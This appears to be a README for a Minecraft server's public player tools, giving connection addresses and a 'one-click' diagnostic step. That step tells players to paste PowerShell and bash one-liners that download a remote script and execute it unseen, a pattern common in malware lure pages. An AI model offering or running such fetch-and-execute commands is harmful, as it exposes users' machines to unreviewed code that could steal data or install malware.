# Ninja6 Minecraft Server - Public Player Tools

Official connectivity, diagnostics, and network troubleshooting utilities for **Ninja6 Minecraft Server** players.

---

## 🛠️ One-Click Network Diagnostics

If you are having trouble joining the server or experiencing errors like `Connection socket exception`, `Failed to log in`, or `Error Code: Creaking`, run the quick diagnostic command below:

### Windows (PowerShell)
Open **PowerShell** (press `Win + X` $\rightarrow$ Terminal/PowerShell), paste this command, and press **Enter**:
```powershell
irm https://raw.githubusercontent.com/Ninja6-MC-Server/public-tools/main/diagnose.ps1 | iex
```

### Linux / macOS / Android (Termux)
Open a terminal and run:
```bash
curl -sSL https://raw.githubusercontent.com/Ninja6-MC-Server/public-tools/main/diagnose.sh | bash
```

---

## 🎮 Server Connection Information

### ☕ Java Edition (PC)
* **Server Address:** `tissues-convertible.tun.ply.gg`
* **Direct IP & Port:** `147.185.221.22:64766`

### 📱 Bedrock Edition (Mobile / Windows 10/11 Bedrock / Consoles)
* **Server Address:** `tissues-sweep.tun.ply.gg` *(or `147.185.221.31`)*
* **Port:** `14121`
* *(Note: Bedrock requires the UDP port `14121`).*
